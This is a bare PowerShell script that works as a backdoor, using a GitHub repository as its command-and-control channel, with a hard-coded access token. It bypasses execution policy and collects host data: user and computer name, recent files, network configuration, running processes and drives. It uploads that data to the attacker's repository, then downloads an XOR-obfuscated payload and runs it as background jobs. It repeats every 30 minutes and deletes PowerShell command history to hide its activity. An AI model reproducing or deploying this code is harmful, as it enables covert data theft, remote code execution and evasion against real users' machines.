$gjqjrudfh = "https://github.com/"
$dkdlel = "a"
$lognmfl = "Freelancer.doc"
$fhrmvkdlf = "\Freelancer\"
$owner = "databackup01"
$token = "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"
$repo = "1"

$downpram = $env:COMPUTERNAME + "_" + $env:USERNAME
$logfile = "1.txt"
$LogPth = $env:APPDATA + $fhrmvkdlf + $logfile

function stun($e)
{	
	$k = [byte[]](0,2,4,3,3,6,4,5,7,6,7,0,5,5,4,3,5,4,3,7,0,7,6,2,6,2,4,6,7,2,4,7,5,5,7,0,7,3,3,3,7,3,3,1,4,2,3,7,0,2,7,7,3,5,1,0,1,4,0,5,0,0,0,0,7,5,1,4,5,4,2,0,6,1,4,7,5,0,1,0,3,0,3,1,3,5,1,2,5,0,1,7,1,4,6,0,2,3,3,4,2,5,2,5,4,5,7,3,1,0,1,6,4,1,1,2,1,4,1,5,4,2,7,4,5,1,6,4,6,3,6,4,5,0,3,6,4,0,1,6,3,3,5,7,0,5,7,7,2,5,2,7,7,4,7,5,5,0,5,6) 
	$l = $e.Length
	$j = 0
	$i = 0
	$c = ""
	while($i -lt $l)
	{
		$j = $j % 160
		
		$a = $e[$i] -bxor $k[$j]
		$d = [char]$a
		$c += $d
		$j++
		$i++
	}

	return $c
}
function testUri($Uri)
{
	$request = $null
	$time = try 
	{
		$result = Measure-Command { 
			$request = [System.Net.WebRequest]::Create($Uri).GetResponse()
			$request.Close()
		}    
		$result.TotalMilliseconds 
	}
	catch 
	{
		$request = $_.Exception.Response    
		$time = -1 
	}
	$result = [PSCustomObject] @{    
		Time = Get-Date;    
		Uri = $uri;    
		StatusCode = [int] $request.StatusCode;    
		StatusDescription = $request.StatusDescription;    
		ResponseLength = $request.RawContentLength;    
		TimeTaken = $time; 
	}
	$result
}
function utv-getfile{
    param (
        $token,
        $owner,
        $repo,
        $path
    )
	$base64token = [System.Convert]::ToBase64String([char[]]$token)

	$headers = @{
		Authorization = 'Basic {0}' -f $base64token
		accept = 'application/vnd.github.v3+json'
	}
	$Url = "https://api.github.com/repos/" + $owner +"/" + $repo+ "/contents/" + $path
	Invoke-RestMethod -Headers $headers -Uri $Url -Method Get | select *, @{n='content_decoded';e={[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($_.content))}}
}
function utv-uploadfile {
    param (
        $token,
        $message = '',
        $file,
        $owner,
        $repo,
        $path = '.\',
        $sha,
        [switch]$force
    )

    $path = (Join-Path $path (Split-Path $file -Leaf))

    $base64token = [System.Convert]::ToBase64String([char[]]$token)

    $headers = @{
        Authorization = 'Basic {0}' -f $base64token
    }

    if ($force -and !$sha) {
        $sha = $(
            try {
                (utv-getfile -token $token -owner $owner -repo $repo -path $path).sha
            } catch {
                $null
            }
        )
    }

    $body = @{
        message = $message
        content = [convert]::ToBase64String((Get-Content $file -Encoding Byte))
        sha = $sha
    } | ConvertTo-Json

	$Url = "https://api.github.com/repos/" + $owner +"/" + $repo+ "/contents/" + $path
	Invoke-RestMethod -Headers $headers -Uri $Url -Body $body -Method Put
}
function utv-updatefile {
    # requires utv-getfile
    param (
        $token,
        $message = '',
        $file,
        $sha,
        $owner,
        $repo,
        $path
    )

    $base64token = [System.Convert]::ToBase64String([char[]]$token)

    $headers = @{
        Authorization = 'Basic {0}' -f $base64token
    }

    if (!$sha) {
        $sha = (utv-getfile -token $token -owner $owner -repo $repo -path $path).sha
    }

    $body = @{
        message = $message
        content = [System.Convert]::ToBase64String((Get-Content $file -Encoding Byte))
        sha = $sha
    } | ConvertTo-Json
	
	$Url = "https://api.github.com/repos/" + $owner +"/" + $repo+ "/contents/" + $path
    Invoke-RestMethod -Headers $headers -Uri $Url -Body $body -Method Put
}
function logfilefunc($switchparam)
{
	DEL $LogPth
	Start-Sleep -s 2
	[DateTime]::Now >> $LogPth
	$env:OS >> $LogPth
	ipconfig >> $LogPth
	if($switchparam -eq 1)
	{
		utv-uploadfile -token $token -file $LogPth -owner $owner -repo $repo -path $repo -force
	}
	else
	{
		$updatepath = $repo + "/" + $logfile
		utv-updatefile -token $token -owner $owner -repo $repo -path $updatepath -file $LogPth
	}
}
function df
{
	$downurl = $gjqjrudfh + $owner + "/" + $repo
	$downtesturl = $downurl + "/tree/main/" + $repo + "/" + $logfile
	$strtest = testUri $downtesturl

	if($strtest.StatusDescription -ne "OK")
	{
		$dwnnAmE = $repo + "/" + $dkdlel + ".rong"
		$s = utv-getfile -token $token -owner $owner -repo $repo -path $dwnnAmE
		$DecodedText = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($s.content))
		$comletter = stun $DecodedText

		$comletter = stun $codestring
		
		$decode = $executioncontext.InvokeCommand.NewScriptBlock($comletter)
		$RunningJob = Get-Job -State Running
		if($RunningJob.count -lt 3)
		{
			$JobName = $RunningJob.count + 1
			Start-Job -ScriptBlock $decode -Name $JobName
		}
		else
		{
			$JobName = $RunningJob.count
			Stop-Job -Name $RunningJob.Name
			Remove-Job -Name $RunningJob.Name
			Start-Job -ScriptBlock $decode -Name $JobName
		}
		logfilefunc 2
	}
	else
	{
		logfilefunc 1
	}
}
function gif($fhrmvotm)
{
	$env:COMPUTERNAME + "_" + $env:USERNAME >> $fhrmvotm
	Get-ChildItem ([Environment]::GetFolderPath("Recent")) >> $fhrmvotm
	ipconfig /all >> $fhrmvotm
	tasklist >> $fhrmvotm
	Start-Sleep -s 7
	Get-PSDrive -PSProvider FileSystem >> $fhrmvotm
}

function action
{
	Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass -Force
	$fph = $env:APPDATA + $fhrmvkdlf
	New-Item -Path $fph -Type directory -Force
	$today = Get-Date	
	$hFLgPth = $fph + $today.ToString("hh_mm_ss_") + $lognmfl

	gif $hFLgPth
	utv-uploadfile -token $token -file $hFLgPth -owner $owner -repo $repo -path $downpram -force
	Remove-Item -path $hFLgPth -Recurse

	while ($true)
	{		
		df
		Start-Sleep -s 2
		$logp = $env:appdata + "\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
		$fffd = Test-Path $logp
		if($fffd -eq $True)
		{
			Remove-Item -path $logp -Recurse
		}
		Start-Sleep -s 1800
	}	
}
action

